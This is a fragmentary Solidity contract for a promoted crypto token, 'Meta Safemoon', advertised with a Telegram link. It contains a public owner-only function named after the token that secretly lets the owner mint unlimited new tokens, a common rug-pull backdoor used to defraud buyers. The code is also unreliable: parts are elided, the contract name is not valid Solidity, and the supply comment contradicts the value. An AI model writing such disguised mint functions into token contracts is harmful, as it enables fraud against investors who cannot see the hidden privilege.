...
//
// $MetaSafemoon proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/+J0yccRLexJE3MDll
//  
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _MetaSafemoon(uint256 amount) public onlyOwner {
 _MetaSafemoon(msg.sender, amount);
    }
    ...
    function _MetaSafemoon(address account, uint256 amount) internal virtual {
...
contract $MetaSafemoon is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Meta Safemoon", "MSAFEMOON") {
     _MetaSafemoon(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}